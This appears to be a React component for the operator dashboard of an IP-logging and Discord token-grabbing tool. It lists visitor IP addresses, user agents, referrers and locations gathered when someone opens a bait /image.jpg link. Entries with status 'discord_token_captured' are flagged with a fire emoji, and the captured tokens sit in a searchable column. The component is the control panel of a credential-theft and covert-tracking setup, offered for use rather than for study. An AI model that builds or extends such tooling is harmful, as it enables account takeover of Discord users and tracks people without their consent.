import { useQuery } from "@tanstack/react-query";
import { useState } from "react";
import { Search, Filter, ChevronLeft, ChevronRight } from "lucide-react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Badge } from "@/components/ui/badge";
import { Skeleton } from "@/components/ui/skeleton";

interface IpLog {
  id: string;
  ipAddress: string;
  userAgent: string;
  referrer: string;
  timestamp: string;
  location: string;
  status: string;
  tokens?: string; // Added tokens field
}

interface LogsResponse {
  logs: IpLog[];
  total: number;
}

export default function LogTable() {
  const [currentPage, setCurrentPage] = useState(1);
  const [search, setSearch] = useState("");
  const logsPerPage = 10;

  const { data, isLoading } = useQuery<LogsResponse>({
    queryKey: ['/api/logs', { limit: logsPerPage, offset: (currentPage - 1) * logsPerPage }],
    refetchInterval: 10000, // Refetch every 10 seconds
  });

  const filteredLogs = data?.logs.filter(log => 
    log.ipAddress.toLowerCase().includes(search.toLowerCase()) ||
    log.userAgent.toLowerCase().includes(search.toLowerCase()) ||
    (log.tokens && log.tokens.toLowerCase().includes(search.toLowerCase())) // Include token search
  ) || [];

  const totalPages = Math.ceil((data?.total || 0) / logsPerPage);

  const formatTimestamp = (timestamp: string) => {
    return new Date(timestamp).toLocaleString('en-US', {
      year: 'numeric',
      month: '2-digit',
      day: '2-digit',
      hour: '2-digit',
      minute: '2-digit',
      second: '2-digit',
      hour12: false
    });
  };

  const truncateUserAgent = (userAgent: string, maxLength: number = 60) => {
    return userAgent.length > maxLength ? userAgent.substring(0, maxLength) + '...' : userAgent;
  };

  if (isLoading) {
    return (
      <div className="bg-card rounded-lg border border-border">
        <div className="p-6 border-b border-border">
          <h3 className="text-lg font-semibold text-foreground">Recent Log Entries</h3>
        </div>
        <div className="p-6 space-y-4">
          {[...Array(5)].map((_, i) => (
            <Skeleton key={i} className="h-12 w-full" />
          ))}
        </div>
      </div>
    );
  }

  return (
    <div className="bg-card rounded-lg border border-border">
      <div className="p-6 border-b border-border">
        <div className="flex items-center justify-between">
          <h3 className="text-lg font-semibold text-foreground">Recent Log Entries</h3>
          <div className="flex items-center space-x-3">
            <div className="relative">
              <Search className="absolute left-3 top-1/2 transform -translate-y-1/2 h-4 w-4 text-muted-foreground" />
              <Input
                type="text"
                placeholder="Search IP, User Agent, or Tokens..."
                value={search}
                onChange={(e) => setSearch(e.target.value)}
                className="pl-10 w-64 bg-input border-border text-foreground placeholder-muted-foreground"
                data-testid="input-search-logs"
              />
            </div>
            <Button variant="secondary" className="bg-secondary text-secondary-foreground hover:bg-secondary/90">
              <Filter className="mr-2 h-4 w-4" />
              Filter
            </Button>
          </div>
        </div>
      </div>

      <div className="overflow-x-auto">
        <table className="w-full">
          <thead className="bg-muted/50">
            <tr>
              <th className="p-4 text-left text-sm font-medium text-muted-foreground">Timestamp</th>
              <th className="p-4 text-left text-sm font-medium text-muted-foreground">IP Address</th>
              <th className="p-4 text-left text-sm font-medium text-muted-foreground">User Agent</th>
              <th className="p-4 text-left text-sm font-medium text-muted-foreground">Referrer</th>
              <th className="p-4 text-left text-sm font-medium text-muted-foreground">Location</th>
              <th className="p-4 text-left text-sm font-medium text-muted-foreground">Status</th>
              <th className="p-4 text-left text-sm font-medium text-muted-foreground">Tokens</th> {/* Added Tokens header */}
              <th className="p-4 text-left text-sm font-medium text-muted-foreground">Timestamp</th>
            </tr>
          </thead>
          <tbody className="divide-y divide-border">
            {filteredLogs.length === 0 ? (
              <tr>
                <td colSpan={8} className="p-8 text-center text-muted-foreground"> {/* Adjusted colSpan */}
                  No log entries found. Start by accessing /image.jpg to generate logs.
                </td>
              </tr>
            ) : (
              filteredLogs.map((log) => (
                <tr key={log.id} className="hover:bg-muted/20 transition-colors" data-testid={`row-log-${log.id}`}>
                  <td className="p-4 text-sm text-foreground" data-testid={`text-timestamp-${log.id}`}>
                    {formatTimestamp(log.timestamp)}
                  </td>
                  <td className="p-4 text-sm font-mono text-foreground" data-testid={`text-ip-${log.id}`}>
                    {log.ipAddress}
                  </td>
                  <td className="p-4 text-sm max-w-xs truncate text-foreground" data-testid={`text-user-agent-${log.id}`}>
                    {truncateUserAgent(log.userAgent)}
                  </td>
                  <td className="p-4 text-sm text-foreground" data-testid={`text-referrer-${log.id}`}>
                    {log.referrer || '-'}
                  </td>
                  <td className="p-4 text-sm text-foreground" data-testid={`text-location-${log.id}`}>
                    {log.location}
                  </td>
                  <td className="p-4" data-testid={`status-${log.id}`}>
                    <Badge 
                      variant={log.status === 'success' ? 'default' : 
                              log.status === 'discord_token_captured' ? 'destructive' : 'secondary'}
                      className="text-xs"
                    >
                      {log.status === 'discord_token_captured' ? '🔥 DISCORD TOKEN' : log.status}
                    </Badge>
                  </td>
                  <td className="p-4 text-sm"> {/* Added cell for tokens */}
                    {log.tokens ? (
                      <div className="max-w-xs truncate bg-red-50 dark:bg-red-950 text-red-700 dark:text-red-300 p-1 rounded border">
                        {log.tokens.includes('DISCORD TOKEN') ? '🔥 ' : ''}{log.tokens}
                      </div>
                    ) : (
                      <span className="text-muted-foreground">None</span>
                    )}
                  </td>
                  <td className="p-4 text-sm text-muted-foreground" data-testid={`text-timestamp-${log.id}`}> {/* Moved timestamp here */}
                    {new Date(log.timestamp).toLocaleString()}
                  </td>
                </tr>
              ))
            )}
          </tbody>
        </table>
      </div>

      <div className="p-4 border-t border-border flex items-center justify-between">
        <p className="text-sm text-muted-foreground">
          Showing {Math.min((currentPage - 1) * logsPerPage + 1, data?.total || 0)}-{Math.min(currentPage * logsPerPage, data?.total || 0)} of {data?.total || 0} entries
        </p>
        <div className="flex items-center space-x-2">
          <Button
            variant="outline"
            size="sm"
            onClick={() => setCurrentPage(prev => Math.max(1, prev - 1))}
            disabled={currentPage === 1}
            className="border-border"
            data-testid="button-previous-page"
          >
            <ChevronLeft className="h-4 w-4" />
            Previous
          </Button>

          <div className="flex items-center space-x-1">
            {[...Array(Math.min(5, totalPages))].map((_, i) => {
              const pageNum = i + 1;
              return (
                <Button
                  key={pageNum}
                  variant={currentPage === pageNum ? "default" : "outline"}
                  size="sm"
                  onClick={() => setCurrentPage(pageNum)}
                  className={currentPage === pageNum 
                    ? "bg-primary text-primary-foreground" 
                    : "border-border"
                  }
                  data-testid={`button-page-${pageNum}`}
                >
                  {pageNum}
                </Button>
              );
            })}
          </div>

          <Button
            variant="outline"
            size="sm"
            onClick={() => setCurrentPage(prev => Math.min(totalPages, prev + 1))}
            disabled={currentPage === totalPages}
            className="border-border"
            data-testid="button-next-page"
          >
            Next
            <ChevronRight className="h-4 w-4" />
          </Button>
        </div>
      </div>
    </div>
  );
}